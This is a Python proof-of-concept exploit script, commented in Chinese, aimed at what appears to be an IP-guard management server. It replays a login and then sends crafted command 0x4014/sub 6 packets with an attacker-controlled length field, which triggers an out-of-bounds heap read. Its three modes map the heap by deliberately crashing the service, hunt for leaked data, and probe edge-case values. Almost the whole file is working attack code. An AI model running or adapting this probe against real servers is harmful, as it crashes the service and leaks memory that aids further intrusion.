"""poc_4E00_oob_probe.py — 测试 cmd=0x4014/sub=6 的 OOB read 原语

漏洞模型 (来自 x64dbg 抓取分析):
  body 结构期望:
    +0: DWORD non-zero
    +4: WORD wcs_length    ← 攻击者控制
    +6: WORD reserved
    +8: wcs[wcs_length]    ← wcs 数据
    +8+2L: WORD NUL terminator

  漏洞代码顺序:
    1) check rsi[0] != 0
    2) length = rsi[4]                    ← 读 16-bit length
    3) cmp rsi[8 + 2*length], 0           ← OOB READ 没校验 body 足够大
    4) check body_len == 2*length + 18

实验目的:
  P1) 用变长 body 控制 length 字段,绘制 heap 周围可读区域 → heap layout oracle
  P2) 寻找让 size 校验通过的 (body_len, length) 组合 → 看 success path 是否 leak 数据
  P3) 测 length 极端值 (0/1/小/大) 的行为

用法:
  python poc_4E00_oob_probe.py 192.168.2.130 8236 Admin admin123456 [mode]
  mode: oracle / sizematch / extreme  (默认 oracle)
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)


def fresh_send(host, port, user, pwd, body, flags=0x4E00, timeout=10.0):
    """返回 (response_dict, crashed:bool)"""
    try:
        base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, lr, st, _ = replay_login(s, user, pwd, base_nonce,
                                       show_crypto=False, verbose=False)
        next_nonce = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=0x4014, a3=6, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            r = parse_packet(recv_full_packet(s))
            return r, False
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": str(e)}, True
    except Exception as e:
        return {"_err": str(e)}, False
    finally:
        try: s.close()
        except: pass


def check_alive(host, port, timeout=3.0):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except: return False


def wait_guard(host, port, max_wait=15.0):
    for _ in range(int(max_wait / 0.5)):
        time.sleep(0.5)
        if check_alive(host, port): return True
    return False


def make_body(length_field, total_size=None, fill=b"\x41"):
    """构造 body:
       +0: DWORD = 1 (非 0 通过 magic 检查)
       +4: WORD = length_field (攻击者控制)
       +6: WORD = 0 (padding)
       +8...: fill 数据 (供 wcs 用)
    """
    base = struct.pack("<I", 1) + struct.pack("<HH", length_field, 0)
    if total_size is None:
        return base
    return base + fill * (total_size - len(base))


def fmt(r):
    if "_err" in r: return f"_err={r['_err'][:40]}"
    fl = r.get("flags", 0); plen = r.get("payload_len", 0)
    plain = r.get("plain", b"")
    pl = len(plain) if isinstance(plain, bytes) else 0
    err = "ERR" if (fl & 0x0002) else "OK "
    return f"flags=0x{fl:04x}[{err}] plen={plen} plain[{pl}B]={plain[:32].hex() if plain else ''}"


def mode_oracle(host, port, user, pwd):
    """P1: 用各种 length 探测 OOB read,看哪些值不崩 (= 落在 mapped 页)"""
    print("=" * 80)
    print("MODE oracle: 控制 length 字段,扫描 heap layout")
    print("=" * 80)
    print(f"{'length':<8} {'body_size':<10} {'result':<60} {'classification':<20}")
    print("-" * 110)

    # 各种 length 值
    test_lengths = [0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048,
                    4096, 0x1000, 0x2000, 0x3000, 0x4000, 0x6060, 0x7000,
                    0x8000, 0xFFFF]

    for L in test_lengths:
        if not check_alive(host, port):
            print(f"  server down, waiting for guard...")
            wait_guard(host, port)

        body = make_body(L, total_size=8)   # 最小 body (8 字节, length=0 时合法)
        r, crashed = fresh_send(host, port, user, pwd, body)

        # 分类
        if crashed:
            cls = "💥 CRASH (unmapped)"
            wait_guard(host, port)
        else:
            fl = r.get("flags", 0)
            plen = r.get("payload_len", 0)
            plain = r.get("plain", b"")
            if fl & 0x0002:
                cls = "✖ ERR (mapped, !NUL)"
            elif plen > 0:
                cls = "✅ OK + DATA (LEAK?)"
            else:
                cls = "✓ clean (mapped+NUL)"
        body_size = 2 * L + 18 if L > 0 else 8
        print(f"{L:<8} {body_size:<10} {fmt(r):<60} {cls}")
        time.sleep(0.3)


def mode_sizematch(host, port, user, pwd):
    """P2: 构造 body_len == 2*length+18 让 size 校验通过, 看 success path"""
    print("=" * 80)
    print("MODE sizematch: body_size = 2*length + 18, 让 size 校验通过")
    print("=" * 80)
    print(f"{'length':<8} {'body_size':<10} {'result':<70}")
    print("-" * 100)

    # length=0 → body_size = 18
    # length=1 → body_size = 20
    # length=2 → body_size = 22
    for L in [0, 1, 2, 4, 8, 16, 32]:
        body_size = 2 * L + 18
        if not check_alive(host, port):
            wait_guard(host, port)

        body = make_body(L, total_size=body_size)
        # 把最后 2 字节设为 NUL 以表示 wcs 结束
        if len(body) >= 2:
            body = body[:-2] + b"\x00\x00"

        r, crashed = fresh_send(host, port, user, pwd, body)
        if crashed:
            wait_guard(host, port)
            print(f"{L:<8} {body_size:<10} 💥 CRASH")
        else:
            print(f"{L:<8} {body_size:<10} {fmt(r)}")
        time.sleep(0.3)


def mode_extreme(host, port, user, pwd):
    """P3: 极端 length + 不同 magic 探索分支"""
    print("=" * 80)
    print("MODE extreme: 探索其它分支和 magic 值")
    print("=" * 80)
    cases = [
        ("magic=0 length=0",      struct.pack("<IHH", 0, 0, 0)),
        ("magic=1 length=0",      struct.pack("<IHH", 1, 0, 0)),
        ("magic=2 length=0",      struct.pack("<IHH", 2, 0, 0)),
        ("magic=0xFFFFFFFF",      struct.pack("<IHH", 0xFFFFFFFF, 0, 0)),
        ("len=0 body=18 NUL",     b"\x01\x00\x00\x00" + b"\x00" * 14),
        ("len=2 body=22 wcs=AB",  b"\x01\x00\x00\x00\x02\x00\x00\x00"
                                  b"A\x00B\x00\x00\x00" + b"\x00" * 8),
    ]
    for label, body in cases:
        if not check_alive(host, port):
            wait_guard(host, port)
        r, crashed = fresh_send(host, port, user, pwd, body)
        if crashed:
            wait_guard(host, port)
            print(f"  {label:30s} → 💥 CRASH (body {len(body)}B = {body.hex()})")
        else:
            print(f"  {label:30s} → {fmt(r)} (body {len(body)}B)")
        time.sleep(0.3)


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]
    mode = sys.argv[5] if len(sys.argv) >= 6 else "oracle"

    if not check_alive(host, port):
        print("server not alive, abort"); sys.exit(1)

    if mode == "oracle":
        mode_oracle(host, port, user, pwd)
    elif mode == "sizematch":
        mode_sizematch(host, port, user, pwd)
    elif mode == "extreme":
        mode_extreme(host, port, user, pwd)
    else:
        print(f"unknown mode {mode}"); sys.exit(1)


if __name__ == "__main__":
    main()
